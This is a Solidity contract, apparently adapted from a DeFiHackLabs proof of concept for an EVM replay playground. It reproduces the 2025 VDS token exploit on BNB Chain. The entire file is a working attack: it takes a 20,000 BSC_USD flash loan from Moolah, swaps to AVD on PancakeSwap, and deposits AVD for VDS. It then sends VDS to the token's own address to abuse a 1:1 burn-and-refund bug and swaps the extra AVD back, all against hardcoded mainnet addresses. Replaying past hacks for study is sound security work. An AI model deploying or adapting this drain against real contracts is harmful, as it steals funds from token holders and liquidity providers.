// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-07-VDS).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the Moolah flash-loan callback `onMoolahFlashLoan` lives on the test
// itself, so there is no standalone contract to deploy). This contract is a
// faithful, self-contained copy of that inline attack (testExploit +
// onMoolahFlashLoan) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/VDS_exp.sol.
//
// Root cause: VDS.deposit() mints VDS 1:1 for deposited AVD, but sending VDS
// directly to the VDS token contract's own address burns it and refunds AVD
// at a 1:1 ratio without checking the AVD/VDS backing accounting elsewhere,
// letting a depositor redeem more AVD than the deposit should allow once
// combined with the PancakeSwap round-trip.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IVDS {
    function deposit(address token, uint256 amount) external;
}

contract VDSDrain {
    address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant AVD_TOKEN = 0x4Ec93ee81f25dA3C8e49F01533cfB734545190A8;
    address constant VDS_TOKEN = 0x6ce69d7146dbaae18c11c36d8D94428623B29D5A;

    // step 0: flash-loan 20k BSC_USD from Moolah; the callback does the drain.
    function run() external {
        IERC20(BSC_USD).approve(MOOLAH, type(uint256).max);
        IMoolah(MOOLAH).flashLoan(BSC_USD, 20_000 ether, "");
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        IERC20 bscUsd = IERC20(BSC_USD);
        IERC20 avd = IERC20(AVD_TOKEN);
        IERC20 vds = IERC20(VDS_TOKEN);

        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));

        bscUsd.approve(PANCAKE_ROUTER, 20_000 ether);
        address[] memory path = new address[](2);
        path[0] = BSC_USD;
        path[1] = AVD_TOKEN;
        // step 1: BSC_USD -> AVD via PancakeSwap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(assets, 0, path, address(this), block.timestamp);

        uint256 avdBalance = avd.balanceOf(address(this));
        avd.approve(VDS_TOKEN, avdBalance);

        // step 2: deposit AVD for VDS
        IVDS(VDS_TOKEN).deposit(VDS_TOKEN, avdBalance);

        // step 3: send VDS directly to the VDS token contract's own address
        // — burns the VDS and refunds AVD at a 1:1 ratio (the bug).
        uint256 amount = 168205391822;
        vds.transfer(VDS_TOKEN, amount);

        avdBalance = avd.balanceOf(address(this));
        avd.approve(PANCAKE_ROUTER, avdBalance);
        path[0] = AVD_TOKEN;
        path[1] = BSC_USD;
        // step 4: AVD -> BSC_USD via PancakeSwap
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(avdBalance, 0, path, address(this), block.timestamp);
    }
}
